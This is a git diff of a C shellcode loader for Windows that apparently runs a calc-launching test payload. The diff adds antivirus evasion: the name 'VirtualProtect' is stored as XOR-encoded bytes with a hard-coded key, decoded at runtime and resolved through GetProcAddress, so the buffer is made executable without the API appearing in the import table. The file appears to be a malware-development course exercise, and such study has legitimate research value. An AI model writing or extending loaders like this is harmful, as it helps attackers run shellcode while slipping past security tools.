@@ -38,6 +38,10 @@ unsigned char calc_payload[] = {
 };
 unsigned int calc_len = sizeof(calc_payload);
 
+// creating global var for every function used in kernal32.dll
+
+BOOL (WINAPI * pVirtualProtect) (LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
+
 void XOR(char * data, size_t data_len, char * key, size_t key_len) {
 	int j;
 	
@@ -56,20 +60,23 @@ int main(void) {
 	BOOL rv;
 	HANDLE th;
     DWORD oldprotect = 0;
-	char key[] = "";
+	char key[] = "ysgadlewneahOASUDNA";
+	char sVirtualProtect[] = { 0x2f, 0x1a, 0x15, 0x15, 0x11, 0xd, 0x9, 0x27, 0x1c, 0xa, 0x15, 0xd, 0x2c, 0x35 };
 
 	// Allocate buffer for payload
 	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
 	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
 
-	//XOR((char *) calc_payload, calc_len, key, sizeof(key));
+	XOR((char *) sVirtualProtect, strlen(sVirtualProtect), key, sizeof(key));
 
 	// Copy payload to the buffer
 	RtlMoveMemory(exec_mem, calc_payload, calc_len);
 	
+
+	pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualProtect);
 	// Make the buffer executable
-	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);
+	rv = pVirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);
 
 	printf("\nHit me!\n");
 	getchar();
